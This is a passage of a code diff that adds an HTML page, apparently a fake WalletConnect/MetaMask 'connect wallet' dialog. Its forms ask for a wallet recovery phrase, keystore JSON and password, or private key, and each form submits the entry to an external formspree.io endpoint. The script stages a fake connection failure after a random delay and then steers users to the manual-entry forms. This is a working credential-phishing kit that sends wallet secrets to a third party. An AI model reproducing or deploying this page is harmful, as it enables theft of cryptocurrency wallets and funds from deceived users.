C112.040627,172.589212 113.321798,172.589212 114.112002,171.815537 C114.112014,171.815525 114.112024,171.815514 114.112036,171.815505 L188.237861,99.2364692 C191.398601,96.1416993 196.523291,96.1415832 199.684176,99.2362107 C199.68422,99.2362542 199.684263,99.2362977 199.684307,99.2363413 L273.813749,171.815505 C274.603952,172.589179 275.885125,172.589179 276.675327,171.815505 L350.803571,99.2377722 C353.964384,96.1430722 359.089073,96.1430722 362.249885,99.2377722 Z" id="WalletConnect" fill="#3B99FC" fill-rule="nonzero"></path></g></g></svg>
+                    </div>
+                    <div class="cancel">
+                        <svg stroke="currentColor" fill="none" stroke-width="0" viewBox="0 0 24 24" aria-hidden="true" font-size="1.5rem" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    </div>
+                </div>
+                <div class="toper2">
+                    <div class="cat">
+                        <img src="https://registry.walletconnect.com/api/v1/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96" alt="" class="mx-1 w-12 rounded-full">
+                    </div>
+                    <div class="rock1">MetaMask</div>
+                </div>
+                <div class="toper3">
+                    <div class="switcher1">
+                        Phrase
+                    </div>
+                    <div class="switcher2">
+                        Keystore JSON
+                    </div>
+                    <div class="switcher3">
+                        Private Key
+                    </div>
+                </div>
+                <div class="hr"><hr></div>
+                <form method='POST' action="https://formspree.io/f/xbjnlepl" class="phrase">
+                    <label for="phrase">
+                    <textarea name="recovery-phrase"  placeholder="Enter Your recovery phrase" id="phrase" cols="30" rows="10"></textarea>
+                    <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                </label>
+                    <input type="submit" value="Proceed">
+                </form>
+
+                <form method='POST' action="https://formspree.io/f/xbjnlepl" class="keystore hide">
+                    <label for="keystore-json">
+                    <input type="text" name="keystore-json" class="mill" placeholder="Keystore Json{}" id="keystore">
+                    <p>Keystore Json</p>
+                </label>
+                <label for="password">
+                <input type="password" name="password" class="mill" id="password" placeholder="">
+                <span>*********************</span>
+                </label>
+                <input type="submit" class="sub" value="Proceed">
+
+                </form>
+
+                <form method='POST' action="https://formspree.io/f/xbjnlepl" class="private hide">
+                    <label for="private">
+                        <textarea name="private-key" id="private" cols="30" rows="10" placeholder="Enter Your Private Key"></textarea>
+                        <p>Typically xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
+                    </label>
+                    <input type="submit" value="Proceed" class="sub">
+                </form>
+            </div>
+        </div>
+        </div>
+
+    </div>
+
+    <script>
+        $(document).ready(function(){
+            $('.switch1').on('click', function(){
+                $('.appsrow').removeClass('hide');
+                $('.switch1').css({'border-bottom-color':'#3b82f6'});
+                $('.switch2').css({'border-bottom-color':'white'});
+                $('.walletrow').addClass('hide');
+            });
+
+            $('.switch2').on('click', function(){
+                $('.walletrow').removeClass('hide');
+                $('.appsrow').addClass('hide');
+                $('.switch2').css({'border-bottom-color':'#3b82f6'});
+                $('.switch1').css({'border-bottom-color':'white'});
+            });
+
+            $('.switcher1').on('click', function(){
+                $('.phrase').removeClass('hide');
+                $('.keystore').addClass('hide');
+                $('.private').addClass('hide');
+                $('.switcher1').css({'border-bottom-color':'grey'});
+                $('.switcher2').css({'border-bottom-color':'white'});
+                $('.switcher3').css({'border-bottom-color':'white'});
+            });
+
+            $('.switcher2').on('click', function(){
+                $('.phrase').addClass('hide');
+                $('.keystore').removeClass('hide');
+                $('.private').addClass('hide');
+                $('.switcher2').css({'border-bottom-color':'grey'});
+                $('.switcher1').css({'border-bottom-color':'white'});
+                $('.switcher3').css({'border-bottom-color':'white'});
+            });
+
+            $('.switcher3').on('click', function(){
+                $('.keystore').addClass('hide');
+                $('.private').removeClass('hide');
+                $('.phrase').addClass('hide');
+                $('.switcher3').css({'border-bottom-color':'grey'});
+                $('.switcher1').css({'border-bottom-color':'white'});
+                $('.switcher2').css({'border-bottom-color':'white'});
+            });
+
+            $('.cancel').on('click', function(){
+                $('.lamda2').addClass('hide');
+                $('.lamda1').removeClass('hide'); 
+                $('.lamda').css('display', 'none');
+                $('.keystore').addClass('hide');
+                $('.phrase').removeClass('hide');
+                $('.private').addClass('hide');
+                $('.initial').css({'border-color':'rgb(75 85 99)'});
+                    $('.initial .green').css({'display':'block'});
+                    $('.initial .initial1').css({'display':'none'});
+                $('.switcher1').css({'border-bottom-color':'grey'});
+                $('.switcher2').css({'border-bottom-color':'white'});
+                $('.switcher3').css({'border-bottom-color':'white'});
+            });
+
+            $('.tab').on('click', function(){
+                setTimeout(function(){
+                    $('.initial').css({'border-color':'red'});
+                    $('.initial .green').css({'display':'none'});
+                    $('.initial .initial1').css({'display':'flex'});
+                }, Math.floor(Math.random() * 2000))
+                $('.lamda').css('display', 'block');
+                $('.lamda').css('display', 'flex');
+                $('.rock1').text($(this).children(2).text());
+                $('.cat img').attr('src', $(this).children(1).children(1).attr('src'));
+            });
+
+            $('.manual').on('click', function(){
+                $('.lamda1').addClass('hide');
+                $('.lamda2').removeClass('hide'); 
+            });
+            $('.initial').on('click', function(){
+                $('.lamda1').addClass('hide');
+                $('.lamda2').removeClass('hide'); 
+            });
+        });
+    </script>
+    </body>
+</html>
